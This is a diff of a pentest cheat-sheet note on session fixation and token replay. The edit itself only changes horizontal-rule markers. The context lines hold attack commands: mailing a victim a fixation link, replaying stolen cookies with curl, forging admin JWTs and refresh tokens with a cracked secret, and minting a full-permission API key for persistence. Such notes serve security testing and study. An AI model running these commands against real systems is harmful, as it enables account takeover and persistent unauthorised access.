@@ -17,7 +17,7 @@ linked:
 ---
 # Session Hijacking - Fixation y Replay
 
-***
+---
 
 ## Set Victim's Session ID Pre-Auth
 
@@ -53,7 +53,7 @@ echo "https://target.com/login?$COOKIE" | mail victim@target.com
 curl -b "$COOKIE" https://target.com/dashboard | grep -i "welcome"
 ```
 
-___
+---
 
 ## Replay Captured Tokens
 
@@ -73,7 +73,7 @@ ___
 | Burp Repeater con `Cookie: session=STOLEN` saved | Manual replay in Burp | Workflow. |
 ^sh-fixation-replay
 
-___
+---
 
 ## Long-lived Sessions / Tokens
 
@@ -93,7 +93,7 @@ ___
 | `python3 -c "import jwt; jwt.encode({'exp':9999999999, 'user':'admin'}, 'CRACKED', algorithm='HS256')"` | Forge JWT con exp far future | Crypto crack + forge. |
 ^sh-fixation-longlived
 
-___
+---
 
 ## Concurrent Session Abuse
 
@@ -112,7 +112,7 @@ ___
 | `curl -X POST -b "session=STOLEN" -d "name=Backup&permissions=full" https://target/api/keys` | Generate new API key for persistent access | Persistence escalate. |
 ^sh-fixation-concurrent
 
-___
+---
 
 ## Refresh Token Replay
 
@@ -132,4 +132,4 @@ ___
 | `python3 -c "import jwt; jwt.encode({'sub':'admin','exp':9999999999,'type':'refresh'}, 'CRACKED', algorithm='HS256')"` | Forge refresh post-crack | Crypto crack + forge. |
 ^sh-fixation-refresh
 
-***
+---
